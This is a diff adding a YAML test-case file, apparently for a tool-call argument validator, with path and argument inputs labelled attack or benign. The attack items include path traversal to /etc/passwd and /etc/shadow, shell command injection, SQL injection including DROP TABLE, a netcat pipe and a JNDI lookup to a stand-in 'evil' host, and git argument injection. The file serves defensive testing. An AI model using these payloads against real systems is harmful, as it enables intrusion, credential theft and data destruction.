@@ -1,0 +1,40 @@
+- {id: T-pa-01, category: argument_injection, label: attack, control: path, input: {path: "....//....//etc/passwd"}}
+- {id: T-pa-02, category: argument_injection, label: attack, control: path, input: {path: "..%2f..%2fetc%2fpasswd"}}
+- {id: T-pa-03, category: argument_injection, label: attack, control: path, input: {path: "..%c0%af..%c0%afetc/passwd"}}
+- {id: T-pa-04, category: argument_injection, label: attack, control: path, input: {path: "%2e%2e%5c%2e%2e%5cwindows"}}
+- {id: T-pa-05, category: argument_injection, label: attack, control: path, input: {path: "reports/..\\..\\secrets"}}
+- {id: T-pa-06, category: argument_injection, label: attack, control: path, input: {path: "\\\\server\\share\\x"}}
+- {id: T-pa-07, category: argument_injection, label: attack, control: path, input: {path: "/data/./../../etc/shadow"}}
+- {id: T-pa-08, category: argument_injection, label: attack, control: path, input: {path: "．．/．．/etc/passwd"}}
+- {id: T-pa-09, category: argument_injection, label: attack, control: path, input: {path: "/data/‮../etc"}}
+- {id: T-pa-10, category: argument_injection, label: attack, control: path, input: {path: "file:///etc/passwd"}}
+- {id: T-pa-11, category: argument_injection, label: attack, control: path, input: {path: "/data%00/../etc/passwd"}}
+- {id: T-pa-12, category: argument_injection, label: attack, control: path, input: {path: "/dataevil/x"}}
+- {id: T-pb-01, category: benign_call, label: benign, control: path, input: {path: "reports/2026/Q3 summary (final).csv"}}
+- {id: T-pb-02, category: benign_call, label: benign, control: path, input: {path: "notes/ünïcode-名前.txt"}}
+- {id: T-pb-03, category: benign_call, label: benign, control: path, input: {path: "a/b/c/d/e/f.txt"}}
+- {id: T-pb-04, category: benign_call, label: benign, control: path, input: {path: "file..name.txt"}}
+- {id: T-pb-05, category: benign_call, label: benign, control: path, input: {path: "100%25 done.txt"}}
+- {id: T-pb-06, category: benign_call, label: benign, control: path, input: {path: "/data/archive/v1..v2.diff"}}
+- {id: T-ai-01, category: argument_injection, label: attack, control: args, input: {value: "x; cat /etc/passwd"}}
+- {id: T-ai-02, category: argument_injection, label: attack, control: args, input: {value: "x$IFS$(id)"}}
+- {id: T-ai-03, category: argument_injection, label: attack, control: args, input: {value: "x`whoami`"}}
+- {id: T-ai-04, category: argument_injection, label: attack, control: args, input: {value: "a||b"}}
+- {id: T-ai-05, category: argument_injection, label: attack, control: args, input: {value: "name' OR 'a'='a"}}
+- {id: T-ai-06, category: argument_injection, label: attack, control: args, input: {value: "1 UNION/**/SELECT/**/password FROM users"}}
+- {id: T-ai-07, category: argument_injection, label: attack, control: args, input: {value: "1;DROP/**/TABLE users"}}
+- {id: T-ai-08, category: argument_injection, label: attack, control: args, input: {value: "admin'--  "}}
+- {id: T-ai-09, category: argument_injection, label: attack, control: args, input: {value: "x\ty|\tnc evil 1"}}
+- {id: T-ai-10, category: argument_injection, label: attack, control: args, input: {value: "%3Bcat%20%2Fetc%2Fpasswd"}}
+- {id: T-ai-11, category: argument_injection, label: attack, control: args, input: {value: "${jndi:ldap://evil/x}"}}
+- {id: T-ai-12, category: argument_injection, label: attack, control: args, input: {value: "ａｂｃ；ｃａｔ ／ｅｔｃ"}}
+- {id: T-ai-13, category: argument_injection, label: attack, control: args, input: {value: "--upload-pack=touch /tmp/pwn"}}
+- {id: T-ai-14, category: argument_injection, label: attack, control: args, input: {amount: 1000001, ceiling: 1000000}}
+- {id: T-ab-01, category: benign_call, label: benign, control: args, input: {value: "Quarterly results for Q3"}}
+- {id: T-ab-02, category: benign_call, label: benign, control: args, input: {value: "O'Reilly Media"}}
+- {id: T-ab-03, category: benign_call, label: benign, control: args, input: {value: "price is $5 (approx.)"}}
+- {id: T-ab-04, category: benign_call, label: benign, control: args, input: {value: "SELECT is a keyword in SQL"}}
+- {id: T-ab-05, category: benign_call, label: benign, control: args, input: {value: "row_1, row_2, row_3"}}
+- {id: T-ab-06, category: benign_call, label: benign, control: args, input: {value: "2026-11-02T10:00:00Z"}}
+- {id: T-ab-07, category: benign_call, label: benign, control: args, input: {value: "naïve café ☕"}}
+- {id: T-ab-08, category: benign_call, label: benign, control: args, input: {amount: 999999, ceiling: 1000000}}
